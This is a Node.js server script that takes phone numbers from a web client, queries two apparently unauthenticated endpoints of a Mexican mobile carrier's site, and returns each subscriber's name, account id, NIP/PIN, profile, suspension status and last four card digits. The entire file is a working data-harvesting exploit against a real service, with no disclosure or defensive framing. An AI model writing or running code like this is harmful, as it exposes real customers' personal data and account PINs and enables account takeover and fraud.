var express = require('express');
	app     = express();
	server  = require('http').createServer(app);
var io      = require('socket.io').listen(server);
var request = require('request');

io.set('log level', 0);

server.listen(1234);

app.configure(function() {
  app.use(express.static(__dirname + '/public'));
  app.use(express.directory(__dirname + '/public'));
  app.use(express.errorHandler());
});

io.sockets.on('connection', function (socket) {
	socket.on('send', function (query) {
		

		var number = query;
		var base1 = 'http://movil2.speedymovil.com.mx/perfils/autenticar/';
		var base2 = 'http://movil2.speedymovil.com.mx/servicios/mdn_query/';

		request(base1 + number + '.json', function(error, response, body) {
  			var json = JSON.parse(body);
  			var first = json.nombre;
  			var last = json.apellidos;
  			var telcel = json.esTelcel;
  			var id = json.id;
  			var nip = json.nip;
  			var type = json.perfil;
  			var suspended = json.suspendida;

  			if(first === null) {
  				first = 'not ';
  				last = 'found';
  				telcel = 'N/A';
  				id = 'N/A';
  				nip = 'N/A';
  				type = 'N/A';
  				suspended = 'N/A';
  			}

  			console.log('Account Name   : ' + first.trim() + ' ' + last);

  			socket.emit('swag', first.trim() + ' ' + last, telcel, type, id, nip, suspended);
		});

		request(base2 + number + '.json', function(error, response, body) {
  			var json = JSON.parse(body);
  			if(json.numerosDeTarjeta[0] === undefined){
  				var digits = 'N/A';
  			} else {
  				var digits = json.numerosDeTarjeta[0].pd_account_number_last4;
  			}
  			socket.emit('swag2', digits);
		});
	});
});
